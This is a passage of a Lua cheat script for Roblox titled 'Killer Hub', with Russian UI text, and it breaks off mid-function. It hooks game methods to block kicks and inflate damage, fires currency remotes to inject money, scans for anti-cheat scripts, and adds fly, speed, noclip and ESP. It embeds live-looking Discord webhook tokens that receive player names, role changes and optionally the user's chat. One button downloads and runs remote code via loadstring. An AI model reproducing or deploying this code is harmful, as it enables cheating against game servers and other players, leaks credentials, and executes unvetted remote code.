-- =======================================================
-- KILLER MENU HUB (FULL + TESTER RANK + BRIDGE)
-- =======================================================
if not game:IsLoaded() then game.Loaded:Wait() end
task.wait(1)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- ==========================================
-- 1. DISCORD WEBHOOKS
-- ==========================================
local WEBHOOK_MAIN = "https://discord.com/api/webhooks/1570008249091096627/sj_wLfzvlU04M1GY_bECguMJgPfC7S9cL2Phy3oeDa9atyjngaFMCX7ysGDjWTs5uhZt"
local WEBHOOK_CHECKER = "https://discord.com/api/webhooks/1570026388688216116/9ByHGOh0Lwh7AQhxSk9ELeikqkcrKmQ0ZxOVquN1fr-zCVSGp9RqzURYJwrabqXtrVCS"
local WEBHOOK_AC_SCANNER = "https://discord.com/api/webhooks/1570051052726784031/3vwjl_j9_wlYCndtBuk-rBusgPx5jKPe9fv0df7fIJOpV5pQ7rUFlYxU0KJHuujUcIyb"
local WEBHOOK_REGISTER = "https://discord.com/api/webhooks/1570063913297514496/tPJAiYFxkmFiSTQk9x1DGeudst0S6zDND1eZqao5aeCOPx7-qXhGoLza6Wb7xNyZ7dnQ"
local WEBHOOK_CHAT_BRIDGE = "https://discord.com/api/webhooks/1570086673977581569/ISZV7pG9B2fEEe2ikMBT2TDx5dKDm1EVCQCYPVE-Thg9-7A-fHxktOv_g3w2kgfRA68v"

local function SendDiscordLog(url, title, desc, color)
    if url == "" then return end
    task.spawn(function()
        local payload = HttpService:JSONEncode({
            username = "🔪 Killer Hub",
            embeds = {{ title = title, description = desc, color = color or 16711680, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") }}
        })
        local success, err = pcall(function()
            request({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = payload })
        end)
        if not success then warn("❌ Ошибка логов Discord: " .. tostring(err)) end
    end)
end

local function SendChatToDiscord(message, author)
    if not message or message == "" then return end
    task.spawn(function()
        local data = HttpService:JSONEncode({
            username = "🎮 Roblox | " .. (author or "Игрок"),
            content = message,
            avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=150&height=150&format=png"
        })
        local success, err = pcall(function()
            request({ Url = WEBHOOK_CHAT_BRIDGE, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = data })
        end)
        if not success then warn("❌ Ошибка чата Discord: ", err) end
    end)
end

-- ==========================================
-- 2. ФАЙЛЫ И РОЛИ (ДОБАВЛЕН ТЕСТЕР)
-- ==========================================
local function _r(f) local s, d = pcall(readfile, f); if s and d then return d end; return "" end
local function _w(f, d) pcall(function() writefile(f, d) end) end 
local function _add(f, n) local d = _r(f); if not string.find(d, "|" .. n .. "|") then _w(f, d .. "|" .. n .. "|") end end
local function _rem(f, n) _w(f, string.gsub(_r(f), "|" .. n .. "|", "")) end
local function HasRole(f, n) if string.find(_r(f), "|" .. n .. "|") then return true end; return false end

local F_Keys = "Killer_Keys.txt"
local F_UsedKeys = "Killer_UsedKeys.txt" 
local F_Session = "Killer_Session.txt"   
local F_Logs = "Killer_AdminLogs.txt"

local F_VIP = "Killer_VIP.txt"
local F_Tester = "Killer_Testers.txt"
local F_Mod = "Killer_Mods.txt"
local F_ChiefMod = "Killer_ChiefMod.txt"
local F_Admin = "Killer_Admins.txt"
local F_DeputyChiefAdmin = "Killer_DeputyChiefAdmin.txt"
local F_ChiefAdmin = "Killer_ChiefAdmin.txt"
local F_TechAdmin = "Killer_TechAdmin.txt"
local F_StaffLeader = "Killer_StaffLeader.txt"
local F_Curator = "Killer_Curators.txt"
local F_Deputy = "Killer_Deputy.txt"
local F_DeputyOwner = "Killer_ChiefDeputy.txt"
local F_Banned = "Killer_Banned.txt"

if _r(F_Keys) == "" then _w(F_Keys, "") end
if _r(F_UsedKeys) == "" then _w(F_UsedKeys, "") end

local _a = {58,91,100,95,105,39,41,38,46,39,47,46,47}
local _b = ""
for _, v in ipairs(_a) do _b = _b .. string.char(v + 10) end
local isOwner = (LocalPlayer.Name == _b or LocalPlayer.Name == "Denis13081989")

local function CheckKey(key, isCheckOnly)
    if not key or key == "" then return false, "Пустой ключ" end
    local keysData = _r(F_Keys)
    for k, exp, role in string.gmatch(keysData, "|([^|]+)|(%d+)|([^|]+)|") do
        if string.upper(k) == string.upper(key) then
            local expTime = tonumber(exp)
            if expTime == 0 or os.time() < expTime then
                return true, role, (expTime == 0 and math.huge or expTime)
            else
                return false, "Ключ истек"
            end
        end
    end
    return false, "Неверный ключ"
end

if HasRole(F_Banned, LocalPlayer.Name) then
    LocalPlayer:Kick("❌ Вы забанены в Killer Hub.")
    return
end

local function GetMyRole()
    if isOwner then return "Owner" end
    if HasRole(F_DeputyOwner, LocalPlayer.Name) then return "Deputy Owner" end
    if HasRole(F_Deputy, LocalPlayer.Name) then return "Deputy" end
    if HasRole(F_Curator, LocalPlayer.Name) then return "Curator" end
    if HasRole(F_StaffLeader, LocalPlayer.Name) then return "Staff Leader" end
    if HasRole(F_TechAdmin, LocalPlayer.Name) then return "Tech Admin" end
    if HasRole(F_ChiefAdmin, LocalPlayer.Name) then return "Chief Admin" end
    if HasRole(F_DeputyChiefAdmin, LocalPlayer.Name) then return "Deputy Chief Admin" end
    if HasRole(F_Admin, LocalPlayer.Name) then return "Admin" end
    if HasRole(F_ChiefMod, LocalPlayer.Name) then return "Chief Mod" end
    if HasRole(F_Mod, LocalPlayer.Name) then return "Mod" end
    if HasRole(F_Tester, LocalPlayer.Name) then return "Tester" end
    if HasRole(F_VIP, LocalPlayer.Name) then return "VIP" end
    return "User"
end

local myRole = GetMyRole()
local hasAdminAccess = (isOwner or myRole == "Deputy Owner" or myRole == "Deputy" or myRole == "Curator" or myRole == "Chief Admin" or myRole == "Admin" or myRole == "Tester")
local canGrantRoles = (isOwner or myRole == "Deputy Owner" or myRole == "Curator")
_G.KeyExpiry = math.huge 

-- ==========================================
-- 3. ЛОГИ, БАН И АНТИЧИТ
-- ==========================================
_G.AntiTamper = true 

local function AddLog(playerName, action)
    _w(F_Logs, "[" .. os.date("%H:%M:%S") .. "] " .. playerName .. ": " .. action .. "\n" .. _r(F_Logs))
end

local function RevokeAllRoles(targetName)
    _rem(F_VIP, targetName); _rem(F_Tester, targetName); _rem(F_Mod, targetName); _rem(F_ChiefMod, targetName)
    _rem(F_Admin, targetName); _rem(F_DeputyChiefAdmin, targetName); _rem(F_ChiefAdmin, targetName)
    _rem(F_TechAdmin, targetName); _rem(F_StaffLeader, targetName); _rem(F_Curator, targetName)
    _rem(F_Deputy, targetName); _rem(F_DeputyOwner, targetName)
    AddLog(LocalPlayer.Name, "Снял ВСЕ роли с " .. targetName)
    SendDiscordLog(WEBHOOK_MAIN, "❌ СНЯТИЕ ВСЕХ РОЛЕЙ", "**Кто снял:** `" .. LocalPlayer.Name .. "`\n**С кого:** `" .. targetName .. "`", 16711680)
end

local function ScanAntiCheat()
    local knownAC = {"anticheat", "antiexploit", "guardian", "shield", "detector", "security", "hyperion", "byfron", "citadel", "zenith", "krampus", "adonis", "rayfield", "owl"} 
    local found = {}
    local servicesToScan = {ReplicatedStorage, workspace, Lighting, LocalPlayer.PlayerScripts}
    for _, service in ipairs(servicesToScan) do
        pcall(function()
            for _, v in ipairs(service:GetDescendants()) do
                if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") then
                    local n = string.lower(v.Name)
                    for _, acName in ipairs(knownAC) do
                        if string.find(n, acName) then
                            local path = v:GetFullName()
                            if not table.find(found, path) then table.insert(found, path) end
                        end
                    end
                end
            end
        end)
    end
    if #found > 0 then 
        SendDiscordLog(WEBHOOK_AC_SCANNER, "🛡️ Античит-Сканер", "**⚠️ НАЙДЕНЫ АНТИЧИТЫ:**\n\n" .. table.concat(found, "\n"), 16711680)
        return "⚠️ НАЙДЕНЫ АНТИЧИТЫ:\n" .. table.concat(found, "\n")
    else 
        SendDiscordLog(WEBHOOK_AC_SCANNER, "🛡️ Античит-Сканер", "Античиты не найдены.", 65280)
        return "✅ Античиты не найдены."
    end
end

local function ScanRemotes()
    local remotes = {}
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
            local n = string.lower(v.Name)
            local advice = ""
            if string.find(n, "money") or string.find(n, "cash") or string.find(n, "coin") then advice = "💰 ВАЛЮТА"
            elseif string.find(n, "damage") or string.find(n, "hit") then advice = "⚔️ УРОН"
            elseif string.find(n, "admin") or string.find(n, "ban") then advice = "👑 АДМИНКА" end
            table.insert(remotes, v.Name .. (advice ~= "" and " -> *" .. advice .. "*" or ""))
        end
    end
    if #remotes > 0 then 
        return "📡 Найдено: " .. #remotes .. "\n\n" .. table.concat(remotes, "\n")
    else
        return "📡 Ремоуты не найдены."
    end
end

local function InjectMoney()
    local injected = 0
    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = string.lower(v.Name)
            if string.find(n, "money") or string.find(n, "cash") or string.find(n, "coin") then
                pcall(function() if v:IsA("RemoteEvent") then v:FireServer(999999) else v:InvokeServer(999999) end; injected = injected + 1 end)
            end
        end
    end
    SendDiscordLog(WEBHOOK_MAIN, "💰 Инжектор Валюты", "**Кто:** `" .. LocalPlayer.Name .. "`\n**Попытка через " .. injected .. " событий!**", 16776960)
end

-- ==========================================
-- 4. ДВИЖОК И ЧИТЫ
-- ==========================================
_G.CheatState = { Fly=false, SpeedHack=false, SpeedValue=50, FlySpeed=60, NoClip=false, Aimbot=false, Esp2D=false, InfJump=false, Fullbright=false, AutoAttack=false, NoCooldown=false, CustomDamage=999999999 }
_G.AutoLogChat = false

LocalPlayer.Chatted:Connect(function(msg)
    if _G.AutoLogChat then SendChatToDiscord(msg, LocalPlayer.Name) end
end)

local ESP_Cache = {} 
task.spawn(function()
    while task.wait(0.3) do
        if _G.CheatState.Esp2D then
            local currentTime = os.clock()
            for _, obj in pairs(workspace:GetChildren()) do
                if obj:IsA("Model") and obj ~= LocalPlayer.Character then
                    local root = obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChild("Torso") or obj:FindFirstChild("Head")
                    if root and root:IsA("BasePart") and root.AssemblyLinearVelocity.Magnitude > 2 then
                        if not ESP_Cache[obj] then
                            local h = Instance.new("Highlight")
                            h.Name = "KillerESP"; h.Parent = obj
                            h.FillColor = Color3.fromRGB(255, 0, 0); h.OutlineColor = Color3.fromRGB(255, 255, 255)
                            ESP_Cache[obj] = { highlight = h, lastMove = currentTime }
                        else
                            ESP_Cache[obj].lastMove = currentTime
                        end
                    end
                end
            end
            for obj, data in pairs(ESP_Cache) do
                if currentTime - data.lastMove > math.random(4, 6) then
                    if data.highlight then data.highlight:Destroy() end
                    ESP_Cache[obj] = nil
                end
            end
        else
            for obj, data in pairs(ESP_Cache) do
                if data.highlight then data.highlight:Destroy() end
                ESP_Cache[obj] = nil
            end
        end
    end
end)

UserInputService.JumpRequest:Connect(function()
    if _G.CheatState.InfJump and LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
    end
end)

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if method == "Kick" and not checkcaller() then return end
    if not checkcaller() and method == "FireServer" then
        local rName = string.lower(tostring(self))
        if string.find(rName, "attack") or string.find(rName, "damage") or string.find(rName, "hit") or string.find(rName, "bite") then
            for i, v in pairs(args) do if type(v) == "number" then args[i] = _G.CheatState.CustomDamage end end
        end
    end
    return oldNamecall(self, unpack(args))
end)

task.spawn(function()
    while task.wait(0.05) do
        if _G.CheatState.AutoAttack or _G.CheatState.NoCooldown then
            local char = LocalPlayer.Character
            if char and char:FindFirstChildOfClass("Tool") then
                local tool = char:FindFirstChildOfClass("Tool")
                if _G.CheatState.NoCooldown then
                    pcall(function() for _, v in pairs(tool:GetDescendants()) do if v:IsA("NumberValue") and (v.Name:lower():find("cool") or v.Name:lower():find("debounce")) then v.Value = 0 end end end)
                end
                pcall(function() tool:Activate() end)
            end
        end
    end
end)

RunService.RenderStepped:Connect(function()
    if os.time() > _G.KeyExpiry then LocalPlayer:Kick("Ключ истек!") return end
    local char = LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart"); local hum = char:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return end
    if _G.CheatState.Fullbright then Lighting.Ambient = Color3.fromRGB(255, 255, 255) end
    
    if _G.CheatState.SpeedHack then
        hum.WalkSpeed = 16
        if not hrp:FindFirstChild("SpeedForce") then local bv = Instance.new("BodyVelocity"); bv.Name = "SpeedForce"; bv.MaxForce = Vector3.new(9e9, 0, 9e9); bv.P = 1250; bv.Parent = hrp end
        local bv = hrp:FindFirstChild("SpeedForce")
        if hum.MoveDirection.Magnitude > 0 then bv.Velocity = hum.MoveDirection * _G.CheatState.SpeedValue else bv.Velocity = Vector3.zero end
    else
        local bv = hrp:FindFirstChild("SpeedForce"); if bv then bv:Destroy() end
    end
    
    if _G.CheatState.NoClip then for _, v in pairs(char:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end end
    
    if _G.CheatState.Fly then
        if not hrp:FindFirstChild("FlyBV") then
            local bv = Instance.new("BodyVelocity", hrp); bv.Name = "FlyBV"; bv.MaxForce = Vector3.new(9e9, 9e9, 9e9); bv.Velocity = Vector3.zero
            local bg = Instance.new("BodyGyro", hrp); bg.Name = "FlyBG"; bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9); bg.P = 1000; hum.PlatformStand = true
        end
        local bv, bg = hrp:FindFirstChild("FlyBV"), hrp:FindFirstChild("FlyBG")
        if bv and bg then
            bg.CFrame = Camera.CFrame; local moveDir = hum.MoveDirection; local finalVelocity = Vector3.zero
            if moveDir.Magnitude > 0 then finalVelocity = moveDir.Unit * _G.CheatState.FlySpeed end
            if hum.Jump then finalVelocity = finalVelocity + Vector3.new(0, _G.CheatState.FlySpeed, 0) end
            bv.Velocity = finalVelocity
        end
    else
        local bv, bg = hrp:FindFirstChild("FlyBV"), hrp:FindFirstChild("FlyBG")
        if bv then bv:Destroy() end; if bg then bg:Destroy() end; hum.PlatformStand = false
    end
end)

-- ==========================================
-- 5. МЕНЮ (ПОЛНОЕ)
-- ==========================================
local function StartMenu(role)
    local ScreenGui = Instance.new("ScreenGui", PlayerGui)
    ScreenGui.Name = "KillerMenuUI"; ScreenGui.ResetOnSpawn = false; ScreenGui.DisplayOrder = 9999
    
    local OpenButton = Instance.new("TextButton", ScreenGui)
    OpenButton.Size = UDim2.new(0, 45, 0, 45); OpenButton.Position = UDim2.new(0, 15, 0.4, 0)
    OpenButton.BackgroundColor3 = Color3.fromRGB(30, 30, 35); OpenButton.Text = "⚙️"; OpenButton.TextSize = 24; OpenButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    OpenButton.Visible = false; Instance.new("UICorner", OpenButton).CornerRadius = UDim.new(1, 0); OpenButton.ZIndex = 9999
    Instance.new("UIStroke", OpenButton).Color = Color3.fromRGB(255, 50, 50)

    local Main = Instance.new("Frame", ScreenGui)
    Main.Size = UDim2.new(0, 520, 0, 340); Main.Position = UDim2.new(0.5, -260, 0.5, -170)
    Main.BackgroundColor3 = Color3.fromRGB(20, 20, 25); Main.Active = true; Main.Draggable = true
    Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 8); Instance.new("UIStroke", Main).Color = Color3.fromRGB(50, 50, 60)
    
    local CloseBtn = Instance.new("TextButton", Main)
    CloseBtn.Size = UDim2.new(0, 30, 0, 30); CloseBtn.Position = UDim2.new(1, -35, 0, 5)
    CloseBtn.BackgroundTransparency = 1; CloseBtn.Text = "❌"; CloseBtn.TextSize = 15; CloseBtn.Font = Enum.Font.GothamBold
    CloseBtn.MouseButton1Click:Connect(function() Main.Visible = false; OpenButton.Visible = true end)
    OpenButton.MouseButton1Click:Connect(function() Main.Visible = true; OpenButton.Visible = false end)

    local Title = Instance.new("TextLabel", Main)
    Title.Size = UDim2.new(1, 0, 0, 30); Title.Position = UDim2.new(0, 0, 0, 20); Title.BackgroundTransparency = 1
    Title.Text = "🔪 KILLER HUB | " .. role; Title.TextColor3 = Color3.fromRGB(255, 255, 255); Title.Font = Enum.Font.GothamBlack; Title.TextSize = 16

    local Sidebar = Instance.new("Frame", Main)
    Sidebar.Size = UDim2.new(0, 130, 1, -60); Sidebar.Position = UDim2.new(0, 5, 0, 55)
    Sidebar.BackgroundColor3 = Color3.fromRGB(15, 15, 20); Instance.new("UICorner", Sidebar).CornerRadius = UDim.new(0, 8)
    
    local SideScroll = Instance.new("ScrollingFrame", Sidebar)
    SideScroll.Size = UDim2.new(1, 0, 1, 0); SideScroll.BackgroundTransparency = 1; SideScroll.ScrollBarThickness = 2; SideScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    Instance.new("UIListLayout", SideScroll).Padding = UDim.new(0, 5); Instance.new("UIPadding", SideScroll).PaddingTop = UDim.new(0, 5)

    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(1, -145, 1, -65); Content.Position = UDim2.new(0, 140, 0, 60); Content.BackgroundTransparency = 1

    local function CreatePage()
        local p = Instance.new("ScrollingFrame", Content); p.Size = UDim2.new(1, 0, 1, 0); p.BackgroundTransparency = 1; p.Visible = false
        p.AutomaticCanvasSize = Enum.AutomaticSize.Y; p.ScrollBarThickness = 4
        Instance.new("UIListLayout", p).Padding = UDim.new(0, 6); return p
    end

    local GenPage, BS_Page, HackPage, ChatPage, GiftPage, GrantPage, LogsPage, CheckerPage, KeyPage, OwnerPage = CreatePage(), CreatePage(), CreatePage(), CreatePage(), CreatePage(), CreatePage(), CreatePage(), CreatePage(), CreatePage(), CreatePage()
    local allPages = {GenPage, BS_Page, HackPage, ChatPage, GiftPage, GrantPage, LogsPage, CheckerPage, KeyPage, OwnerPage}

    local function CreateTab(txt, p)
        local b = Instance.new("TextButton", SideScroll); b.Size = UDim2.new(1, 0, 0, 35); b.BackgroundColor3 = Color3.fromRGB(25, 25, 30); b.Text = " " .. txt; b.TextColor3 = Color3.fromRGB(200, 200, 200); b.Font = Enum.Font.GothamBold; b.TextSize = 12; b.TextXAlignment = Enum.TextXAlignment.Left
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
        b.MouseButton1Click:Connect(function()
            for _, page in pairs(allPages) do page.Visible = false end; p.Visible = true
            for _, btn in pairs(SideScroll:GetChildren()) do if btn:IsA("TextButton") then btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30); btn.TextColor3 = Color3.fromRGB(200,200,200) end end
            b.BackgroundColor3 = Color3.fromRGB(80, 80, 80); b.TextColor3 = Color3.fromRGB(255, 255, 255)
        end)
    end

    local function CreateToggle(p, txt, callback, default)
        local f = Instance.new("Frame", p); f.Size = UDim2.new(1, -10, 0, 35); f.BackgroundTransparency = 1
        local l = Instance.new("TextLabel", f); l.Size = UDim2.new(0.7, 0, 1, 0); l.BackgroundTransparency = 1; l.Text = txt; l.TextColor3 = Color3.fromRGB(220, 220, 220); l.Font = Enum.Font.Gotham; l.TextSize = 12; l.TextXAlignment = Enum.TextXAlignment.Left
        local s = Instance.new("TextButton", f); s.Size = UDim2.new(0, 40, 0, 20); s.Position = UDim2.new(1, -40, 0.5, -10); s.BackgroundColor3 = default and Color3.fromRGB(80, 80, 80) or Color3.fromRGB(40, 40, 45); s.Text = ""
        Instance.new("UICorner", s).CornerRadius = UDim.new(1, 0); local k = Instance.new("Frame", s); k.Size = UDim2.new(0, 16, 0, 16); k.Position = default and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8); k.BackgroundColor3 = Color3.fromRGB(200, 200, 200); Instance.new("UICorner", k).CornerRadius = UDim.new(1, 0)
        local st = default
        s.MouseButton1Click:Connect(function()
            st = not st; TweenService:Create(s, TweenInfo.new(0.2), {BackgroundColor3 = st and Color3.fromRGB(80, 80, 80) or Color3.fromRGB(40, 40, 45)}):Play()
            TweenService:Create(k, TweenInfo.new(0.2), {Position = st and UDim2.new(1, -18, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)}):Play(); callback(st)
        end)
    end

    local function CreateInput(p, txt, defaultVal, callback)
        local f = Instance.new("Frame", p); f.Size = UDim2.new(1, -10, 0, 35); f.BackgroundTransparency = 1
        local l = Instance.new("TextLabel", f); l.Size = UDim2.new(0.6, 0, 1, 0); l.BackgroundTransparency = 1; l.Text = txt; l.TextColor3 = Color3.fromRGB(220, 220, 220); l.Font = Enum.Font.Gotham; l.TextSize = 12; l.TextXAlignment = Enum.TextXAlignment.Left
        local box = Instance.new("TextBox", f); box.Size = UDim2.new(0.35, 0, 0, 25); box.Position = UDim2.new(0.65, 0, 0.5, -12.5); box.BackgroundColor3 = Color3.fromRGB(30, 30, 35); box.Text = tostring(defaultVal); box.TextColor3 = Color3.fromRGB(255, 255, 255); box.Font = Enum.Font.GothamBold; box.TextSize = 12
        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 4)
        box.FocusLost:Connect(function() local num = tonumber(box.Text); if num then callback(num) else box.Text = tostring(defaultVal) end end)
    end

    local function CreateButton(p, txt, color, callback)
        local b = Instance.new("TextButton", p); b.Size = UDim2.new(1, -10, 0, 35); b.BackgroundColor3 = color; b.Text = txt; b.TextColor3 = Color3.fromRGB(255,255,255); b.Font = Enum.Font.GothamBold; b.TextSize = 11
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4); 
        b.MouseButton1Click:Connect(function() callback(); end)
    end

    -- ВКЛАДКА 1: ОСНОВНОЕ
    CreateTab("⚙️ Основное", GenPage)
    CreateToggle(GenPage, "SpeedHack", function(s) _G.CheatState.SpeedHack = s end, false)
    CreateInput(GenPage, "Скорость (SpeedHack)", 50, function(val) _G.CheatState.SpeedValue = val end)
    CreateToggle(GenPage, "Fly", function(s) _G.CheatState.Fly = s end, false)
    CreateInput(GenPage, "Скорость (Fly)", 60, function(val) _G.CheatState.FlySpeed = val end)
    CreateToggle(GenPage, "NoClip", function(s) _G.CheatState.NoClip = s end, false)

    -- ВКЛАДКА 2: БОЕВАЯ СИСТЕМА
    CreateTab("🎯 Боевая система", BS_Page)
    CreateToggle(BS_Page, "ESP Подсветка (Движение)", function(s) _G.CheatState.Esp2D = s end, false)
    CreateInput(BS_Page, "Урон (Max 999999999)", 999999999, function(val) _G.CheatState.CustomDamage = math.min(val, 999999999) end)
    CreateToggle(BS_Page, "⚔️ Авто-Атака (Спам)", function(s) _G.CheatState.AutoAttack = s end, false)
    CreateToggle(BS_Page, "⚡ Ускорение Атаки (Без КД)", function(s) _G.CheatState.NoCooldown = s end, false)

    -- ВКЛАДКА 3: УТИЛИТЫ
    CreateTab("💻 Утилиты", HackPage)
    CreateToggle(HackPage, "Бесконечный прыжок", function(s) _G.CheatState.InfJump = s end, false)
    CreateButton(HackPage, "💰 Инжектор Валюты", Color3.fromRGB(200, 200, 50), function() InjectMoney() end)
    CreateButton(HackPage, "Загрузить IY", Color3.fromRGB(60, 120, 255), function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() end)

    -- ВКЛАДКА 4: ЧАТ (МОСТ В ДС)
    CreateTab("💬 Глобал Чат", ChatPage)
    local chatInput = Instance.new("TextBox", ChatPage); chatInput.Size = UDim2.new(1, -10, 0, 35); chatInput.BackgroundColor3 = Color3.fromRGB(30, 30, 35); chatInput.PlaceholderText = "Введите текст..."; chatInput.TextColor3 = Color3.fromRGB(255,255,255)
    Instance.new("UICorner", chatInput).CornerRadius = UDim.new(0, 4)
    CreateButton(ChatPage, "Отправить в Discord", Color3.fromRGB(88, 101, 242), function()
        if chatInput.Text ~= "" then SendChatToDiscord(chatInput.Text, LocalPlayer.Name); chatInput.Text = "" end
    end)
    CreateToggle(ChatPage, "📡 Авто-Лог чата", function(s) _G.AutoLogChat = s end, false)

    -- ВКЛАДКА 5: ПОДАРКИ (OWNER)
    if isOwner then
        CreateTab("🎁 Подарки", GiftPage)
        local targetInput = Instance.new("TextBox", GiftPage); targetInput.Size = UDim2.new(1, -10, 0, 30); targetInput.BackgroundColor3 = Color3.fromRGB(20, 20, 25); targetInput.PlaceholderText = "Ник получателя..."; targetInput.TextColor3 = Color3.fromRGB(255,255,255)
        Instance.new("UICorner", targetInput).CornerRadius = UDim.new(0, 4)
        local giftRole = "VIP"
        CreateButton(GiftPage, "🎁 Подарить VIP ключ", Color3.fromRGB(50, 150, 50), function()
            if targetInput.Text ~= "" then
                local hash = "" for i = 1, 12 do hash = hash .. string.format("%x", math.random(0, 15)) end
                local newKey = "VIP_KEY_" .. hash
                _w(F_Keys, _r(F_Keys) .. "|" .. newKey .. "|0|VIP|")
                SendDiscordLog(WEBHOOK_MAIN, "🎁 ПОДАРОК", "**Кто:** `"..LocalPlayer.Name.."`\n**Кому:** `"..targetInput.Text.."`\n**Ключ:** `"..newKey.."`", 65280)
            end
        end)
    end

    -- ВКЛАДКА 6: ВЫДАЧА РОЛЕЙ (ДОБАВЛЕН ТЕСТЕР)
    if canGrantRoles then
        CreateTab("🎁 Выдача", GrantPage)
        local targetInput = Instance.new("TextBox", GrantPage); targetInput.Size = UDim2.new(1, -10, 0, 35); targetInput.BackgroundColor3 = Color3.fromRGB(20, 20, 25); targetInput.PlaceholderText = "Ник игрока..."; targetInput.TextColor3 = Color3.fromRGB(255,255,255)
        Instance.new("UICorner", targetInput).CornerRadius = UDim.new(0, 4)
        
        local function GrantRoleBtn(text, file, color)
            CreateButton(GrantPage, text, color, function()
                if targetInput.Text ~= "" then 
                    _add(file, targetInput.Text); 
                    SendDiscordLog(WEBHOOK_MAIN, "👑 ВЫДАЧА", "**Кто:** `"..LocalPlayer.Name.."`\n**Кому:** `"..targetInput.Text.."`\n**Роль:** "..text, 65280)
                end
            end)
        end

        GrantRoleBtn("Выдать VIP", F_VIP, Color3.fromRGB(100, 150, 50))
        GrantRoleBtn("Выдать Тестера", F_Tester, Color3.fromRGB(255, 165, 0))
        GrantRoleBtn("Выдать Модера", F_Mod, Color3.fromRGB(80, 120, 150))
        GrantRoleBtn("Выдать Гл. Модера", F_ChiefMod, Color3.fromRGB(100, 150, 200))
        GrantRoleBtn("Выдать Админа", F_Admin, Color3.fromRGB(150, 80, 50))
        GrantRoleBtn("Выдать Зам. Гл. Админа", F_DeputyChiefAdmin, Color3.fromRGB(180, 80, 80))
        GrantRoleBtn("Выдать Гл. Админа", F_ChiefAdmin, Color3.fromRGB(200, 100, 100))
        GrantRoleBtn("Выдать Тех Админа", F_TechAdmin, Color3.fromRGB(200, 50, 50))
        GrantRoleBtn("Выдать Стафф Лидера", F_StaffLeader, Color3.fromRGB(200, 200, 50))
        
        if isOwner or myRole == "Deputy Owner" then
            GrantRoleBtn("Выдать Куратора", F_Curator, Color3.fromRGB(200, 150, 50))
            GrantRoleBtn("Выдать Зама", F_Deputy, Color3.fromRGB(150, 50, 150))
        end
        if isOwner then
            GrantRoleBtn("Выдать Зам. Овнера", F_DeputyOwner, Color3.fromRGB(200, 50, 200))
        end

        CreateButton(GrantPage, "❌ СНЯТЬ ВСЕ РОЛИ", Color3.fromRGB(200, 30, 30), function()
            if targetInput.Text ~= "" and targetInput.Text ~= _b then RevokeAllRoles(targetInput.Text) end
        end)
    end

    -- ВКЛАДКА 7: ЛОГИ
    if hasAdminAccess then
        CreateTab("🕵️ Наблюдение", LogsPage)
        local logBox = Instance.new("ScrollingFrame", LogsPage); logBox.Size = UDim2.new(1, -10, 0, 250); logBox.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
        Instance.new("UICorner", logBox).CornerRadius = UDim.new(0, 4); Instance.new("UIListLayout", logBox).Padding = UDim.new(0, 2)
        task.spawn(function() 
            while logBox.Parent do 
                for _, v in pairs(logBox:GetChildren()) do if v:IsA("TextLabel") then v:Destroy() end end
                for line in string.gmatch(_r(F_Logs), "[^\n]+") do 
                    local lbl = Instance.new("TextLabel", logBox); lbl.Size = UDim2.new(1, -10, 0, 20); lbl.BackgroundTransparency = 1
                    lbl.Text = line; lbl.TextColor3 = Color3.fromRGB(150, 150, 150); lbl.Font = Enum.Font.Code; lbl.TextSize = 11; lbl.TextXAlignment = Enum.TextXAlignment.Left 
                end; task.wait(3) 
            end 
        end)
    end

    -- ВКЛАДКА 8: ЧЕКЕР
    if isOwner then
        CreateTab("🕵️ Чекер", CheckerPage)
        local checkInput = Instance.new("TextBox", CheckerPage); checkInput.Size = UDim2.new(1, -10, 0, 35); checkInput.BackgroundColor3 = Color3.fromRGB(20, 20, 25); checkInput.PlaceholderText = "Ник игрока..."; checkInput.TextColor3 = Color3.fromRGB(255,255,255)
        Instance.new("UICorner", checkInput).CornerRadius = UDim.new(0, 4)
        
        local checkResult = Instance.new("TextBox", CheckerPage); checkResult.Size = UDim2.new(1, -10, 0, 120); checkResult.BackgroundColor3 = Color3.fromRGB(10, 10, 12); checkResult.TextColor3 = Color3.fromRGB(200, 200, 200); checkResult.TextWrapped = true; checkResult.Text = "Ожидание..."
        checkResult.TextEditable = false; Instance.new("UICorner", checkResult).CornerRadius = UDim.new(0, 4)

        CreateButton(CheckerPage, "🌐 Инфо об игроке", Color3.fromRGB(50, 150, 200), function()
            local target = checkInput.Text; local p = Players:FindFirstChild(target)
            if p then
                local roles = {}
